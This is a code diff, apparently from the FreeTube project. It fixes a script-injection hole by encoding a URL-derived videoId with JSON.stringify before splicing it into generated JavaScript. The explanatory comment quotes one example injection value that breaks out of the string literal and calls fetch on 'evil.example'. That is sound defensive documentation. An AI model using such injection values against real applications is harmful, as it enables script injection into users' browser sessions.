@@ -189,13 +189,26 @@
    * `export{X as default};` tail for a call passing this mint's own
    * arguments, spliced in as the JSON-string literals FreeTube already
    * serialised them to.
+   *
+   * `videoId` is the one argument here that is NOT already a JSON-string
+   * literal upstream produced -- it is a bare string that ultimately traces
+   * back to the URL (`#/watch/<videoId>`, an attacker-reachable route), so
+   * upstream's own `"${videoId}"` splice would let a crafted id such as
+   * `"});fetch("https://evil.example");//` break out of the string literal
+   * and inject script into the youtube.com context this runs in.
+   * `JSON.stringify(videoId)` closes that: whatever `videoId` contains, the
+   * result is one JSON string literal. `context`/`initialAttestationData`/
+   * `ytConfig` stay spliced as-is because they are already
+   * `JSON.stringify` output from FreeTube's own call site (`local.js`), not
+   * raw input -- re-encoding them would double-encode, and upstream's real
+   * Electron build splices them the same way.
    */
   function rewriteBotGuardScript (script, videoId, context, initialAttestationData, ytConfig) {
     const exportMatch = script.match(/export\{(\w+) as default\};/)
     if (exportMatch === null) {
       throw new Error('botGuardScript.js: no `export{X as default};` tail -- pack:botGuardScript output changed shape')
     }
-    const params = `"${videoId}",${context},${initialAttestationData},${ytConfig}`
+    const params = `${JSON.stringify(videoId)},${context},${initialAttestationData},${ytConfig}`
     return `${script.slice(0, exportMatch.index)};${exportMatch[1]}(${params})`
   }
 
